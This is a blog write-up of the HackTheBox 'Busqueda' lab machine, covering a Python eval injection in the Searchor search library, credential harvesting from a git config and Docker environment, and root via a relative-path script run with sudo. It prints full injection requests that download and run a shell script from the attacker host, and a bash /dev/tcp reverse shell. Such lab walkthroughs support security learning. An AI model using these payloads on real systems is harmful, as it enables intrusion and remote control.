---
layout:     post
title:      "HackTheBox - Busqueda"
subtitle:   "Write-Up"
date:       2023-08-12
author:     "D4mianwayne"
tags:    ["bash, easy, eval, python-code-injection, relative-path-exploit"]
categories: ["HackTheBox"]
layout: "simple"

---



Writeup for HackTheBox Busqueda Machine

<!-- more -->

Starting off with the `nmap` scan, we see that it has HTTP and SSH, as expected. 

```python
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp   open  http        Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
8080/tcp open  http-proxy?
```

Now, moving on with the `searcher.htb` , it seems to provide a search service where you can use different search engines

![](/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled.png)

From further enumeration, we identified that the application is built on top of https://github.com/ArjunSharda/Searchor which we got from the footer of the page.  The version number mentioned on the page was 2.4.0 and the latest was 2.5.2. To check for the specific version, from the commit changes I noticed there was an `eval` function which was called with the given values for the `query` and `engine` 

![](/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_1.png)

Above code is something of interest, what we can do here is exploit that `eval` to use python functions like `compile` (this is used to evaluate the python code as expressions and execute the code) , this can be done by doing something like `' <python code>`

```python
query=test'+eval(compile('for x in range(1):\n import os\n os.system("curl 10.10.14.22/shell.sh -o /tmp/shell.sh")','a','single'))+'
```

Now, this will execute the payload such that it will call `eval` again which will evaluate the code `compile` executing the code, here we downloading a bash script which will later gets executed with `os.system` 

```jsx
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 157
Origin: http://searcher.htb
Connection: close
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1

engine=Accuweather&query=test'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("curl+10.10.14.22/shell.sh+-o+/tmp/shell.sh")','a','single'))%2b'
```

Now, following will just execute the previously downloaded bash script:

```jsx
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 133
Origin: http://searcher.htb
Connection: close
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1

engine=Accuweather&query=test'%2beval(compile('for+x+in+range(1)%3a\n+import+os\n+os.system("bash+/tmp/shell.sh")','a','single'))%2b'
```

Doing so, we got the reverse shell as `svc` user:

![](/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_2.png)

In the same directory, there was a `.git` folder which had the `config` file which had the password for the `cody` user:

```jsx
bash-5.1$ cat .git/config
cat config
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```

The `svc` user had `user.txt` which we can get:

```jsx
bash-5.1$ cd ~/
cd ~/
bash-5.1$ pwd
pwd
/home/svc
bash-5.1$ ls -la
ls -la
total 44
drwxr-x--- 6 svc  svc  4096 Apr 22 16:42 .
drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwx------ 3 svc  svc  4096 Apr 22 16:42 .gnupg
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwx------ 3 svc  svc  4096 Apr 22 16:41 snap
-rw-r----- 1 root svc    33 Apr 22 12:28 user.txt
bash-5.1$ cat user.txt
cat user.txt
ef72983276d36e5283938e4b72f9898d
```

Now, using the `cody` user’s password for performing `sudo -l` on the machine, we see that

```jsx
bash-5.1$ sudo -l
sudo -l
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

It seems we can see the `[system-checkup.py](http://system-checkup.py)` as `root` user, although we did not have any permissions to read the file./

- If you request a field which is itself a structure containing other fields, by default you get a Go-style dump of the inner values. Docker adds a template function, `json` , which can be applied to get results in JSON format.

Normally, it provided 3 functionalities, 2 for docker related commands and one for system check 

```jsx
bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e
<er-inspect --format='{{json .Config}}' 960873171e2e
--format={"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}

bash-5.1$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' f84a6b33fb5a
<er-inspect --format='{{json .Config}}' f84a6b33fb5a
--format={"Hostname":"f84a6b33fb5a","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"3306/tcp":{},"33060/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF","MYSQL_USER=gitea","MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh","MYSQL_DATABASE=gitea","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","GOSU_VERSION=1.14","MYSQL_MAJOR=8.0","MYSQL_VERSION=8.0.31-1.el8","MYSQL_SHELL_VERSION=8.0.31-1.el8"],"Cmd":["mysqld"],"Image":"mysql:8","Volumes":{"/var/lib/mysql":{}},"WorkingDir":"","Entrypoint":["docker-entrypoint.sh"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"db","com.docker.compose.version":"1.29.2"}}
```

Although from the `docker-ps` and `docker-inspect` , we got the information about the running containers, in which there was plaintext password for the database users, trying the same passwords on the `gitea.searcher.htb` for `administrator` user

```jsx
administrator:yuiu1hoiu4i5ho1uh
```

Now, we can successfully login to the application as `administrator` user and a see a repository called `scripts` 

![](/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_3.png)

Upon checking the repository, it contained the `[system-checkup.py](http://system-checkup.py)` python file which we can analyse to see anything interesting of any sort, what we can see here is, it is using the `subprocess` to run commands, there was an interesting part in the code which was executing the `[full-checkup.sh](http://full-checkup.sh)` from the current directory instead of using absolute path for the script, this can be used in our advantage to create a `full-checkup.sh` in our directory and then run the `system-checkup.py` as `root` user which will execute the custom created `full-checkup.sh` script:

![](/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_4.png)

Creating the `[full-checkup.sh](http://full-checkup.sh)` with the reverse shell code and giving it the execute permission:

```jsx
full-checkup.sh

#!/bin/bash
bash -i >& /dev/tcp/10.10.14.22/443 0>&1
```

Now, just execute the command and we got the reverse shell as root:

![](/img/Busqueda_cc54d792287342bd91f5e124e3d86184/Untitled_5.png)


